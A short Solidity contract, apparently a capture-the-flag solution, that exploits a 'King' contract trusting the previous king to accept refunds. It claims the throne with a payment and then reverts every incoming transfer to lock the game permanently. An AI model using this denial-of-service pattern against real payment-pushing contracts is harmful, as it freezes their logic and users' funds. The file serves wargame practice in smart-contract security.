// SPDX-License-Identifier: MIT
pragma solidity >= 0.8.0;

/** @notice I'll be honest, I couldn't solve it in one go, took
 	a bit of tries. If we read through the function, there is
	only one vulnerability ready to be exploited i.e. the wannabe
	king is trusting the previous king to send tokens to him.
	We can use this vulnerability to create a king that simply
	denies sending any amount and voila, you are the new
	ethernal king of the kingdom.
*/
contract KingHack {
    address king = KING_CONTRACT_ADDRESS;

	constructor() payable {
        king.call{value: 0.0015 ether}("");
	}

	fallback() external payable {
        revert("haha sucker!");
    }
}